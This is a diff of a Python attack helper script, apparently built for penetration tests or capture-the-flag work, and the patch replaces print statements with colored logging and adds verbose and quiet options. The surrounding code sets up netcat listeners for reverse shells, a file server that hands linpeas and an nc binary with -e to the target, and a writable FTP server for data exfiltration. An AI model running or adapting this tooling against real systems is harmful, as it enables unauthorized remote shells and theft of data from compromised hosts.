@@ -7,6 +7,28 @@ import threading
 import socket
 import fcntl
 import struct
+import logging
+import colorlog
+
+
+# Set up logging
+logger = logging.getLogger(__name__)  # __name__ is the name of the current module
+logger.setLevel(logging.DEBUG)  # set the logging level to DEBUG
+
+formatter = colorlog.ColoredFormatter(
+    '%(log_color)s%(levelname)s:%(message)s',
+    log_colors={
+        'DEBUG': 'cyan',
+        'INFO': 'green',
+        'WARNING': 'yellow',
+        'ERROR': 'red',
+        'CRITICAL': 'red,bg_white',
+    }
+)
+
+handler = colorlog.StreamHandler()
+handler.setFormatter(formatter)
+
 
 
 def parse_args():
@@ -17,6 +39,8 @@ def parse_args():
     parser.add_argument("-d", "--dport", help="The port to use for data exfiltration",
                         type=int, default=None)
     parser.add_argument("-o", "--os", help="Currently not used", type=str, default="Linux")
+    parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
+    parser.add_argument("-q", "--quiet", help="Quiet output", action="store_true")
     args = parser.parse_args()
     return args
 
@@ -29,7 +53,7 @@ def get_file(tmp_dir, ip, lport, p, filename):
 def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     p = process("/bin/bash")  # Spawns a process
     p.sendline(f"nc -lvnp {port}".encode())
-    print(f"[+] Reverse shell_recon listening on port {port}")
+    logger.info(f"[+] Reverse shell_recon listening on port {port}")
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
@@ -52,13 +76,13 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
 def file_server(lport):
     p = process("/bin/bash")
     p.sendline(f"python3 -m http.server {lport}".encode())
-    print(f"[+] File server is listening on port {lport}")
+    logger.info(f"[+] File server is listening on port {lport}")
 
 
 def manual_shell(mport):
     p = process("/bin/bash")
     p.sendline(f"nc -lvnp {mport}".encode())
-    print(f"[+] Manual shell listening on port {mport}")
+    logger.info(f"[+] Manual shell listening on port {mport}")
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
@@ -77,45 +101,46 @@ def get_ip_address(ifname):
 
 
 def checks(args):
+
     # Sudo check if -d is used
     if args.dport is not None:
         if os.geteuid() != 0 and args.dport < 1024:
-            print(f"[X] You need to have root privileges to run pyftpdlib on port {args.dport}.")
+            logger.error(f"[X] You need to have root privileges to run pyftpdlib on port {args.dport}.")
             return False
         else:
-            print(f"[+] FTP Server will run on port {args.dport}")
+            logger.info(f"[+] FTP Server will run on port {args.dport}")
 
     # Check if linpeas is present
     if os.path.exists("./www/linpeas.sh"):
-        print("[+] Linpeas is present in the www directory")
+        logger.debug("[?] Linpeas is present in the www directory")
 
     else:
-        print("[!] The file doesn't exist on the local machine")
+        logger.debug("[?] The linpeas script does not exist on the local machine")
         # Prompt the user to download the file
         download = input("[?] Do you want to download the file? /!\\ Might be outdated /!\\ (y/n):").strip()
         if download == 'y':
             # Download the file
-            print("[+] Downloading the file...")
+            logger.info("[+] Downloading the file...")
             os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")
 
         else:
             # Prompt to continue without linpeas
             continue_without_linpeas = input("[?] Do you want to continue without linpeas? (y/n): ").strip()
             if continue_without_linpeas == 'y':
-                print("[+] Continuing without linpeas")
+                logger.info("[+] Continuing without linpeas")
             else:
                 return False
 
     # Check if correct nc is present if not copy it and check if it is compatible
     if os.path.exists("./www/nc"):
-        print("[+] The nc binary is in the www folder")
-        print("[!] Make sure the nc has the -e option! As the script uses does not check for it!")
+        logger.debug("[?] The nc binary is in the www folder")
+        logger.debug("[?] Make sure the nc has the -e option! As the script uses does not check for it!")
         # Nc is present compatability is not checked!
         return True
 
     else:
-        print("[!] The nc is not in the www folder copying it from /bin/nc")
-        print("[+] Make sure the nc has the -e option! As the script uses does not check for it!")
+        logger.debug("[!] The nc is not in the www folder copying it from /bin/nc")
+        logger.debug("[?] Make sure the nc has the -e option! As the script uses does not check for it!")
         os.system("cp /bin/nc ./www/nc")
         return True
 
@@ -123,7 +148,7 @@ def checks(args):
 # Function to start the ftp server if -d is used
 def data_exfiltration(dport):
     p = process("/bin/bash")
-    print("[+] Starting the ftp server...")
+    logger.info("[+] Starting the ftp server...")
     p.sendline("cd ./exfil".encode())
     p.sendline(f"python -m pyftpdlib -p {dport} --write".encode())
 
@@ -144,15 +169,25 @@ def main():
     # Parse the arguments
     args = parse_args()
 
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+    else:
+        logger.setLevel(logging.INFO)
+
+    if args.quiet:
+        logger.setLevel(logging.CRITICAL)
+
+    logger.addHandler(handler)
+
     # Check if the arguments are correct
     if not checks(args):
-        print("Exiting...")
+        logger.error("[X] Exiting...")
         exit()
 
     # Create a temporary directory
     tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
     # Print the temporary directory
-    print(f"[+] Temporary directory: {tmp_dir}")
+    logger.info(f"[+] Temporary directory: {tmp_dir}")
 
     # Get the arguments
     lport = args.lport
@@ -177,10 +212,10 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("Exiting...")
+        logger.warning("[!] Exiting...")
         sys.exit(0)
     except SystemExit:
         raise
     except:
-        print("[X] Unexpected error:", sys.exc_info()[0])
+        logger.error("[X] Unexpected error:", sys.exc_info()[0])
         raise
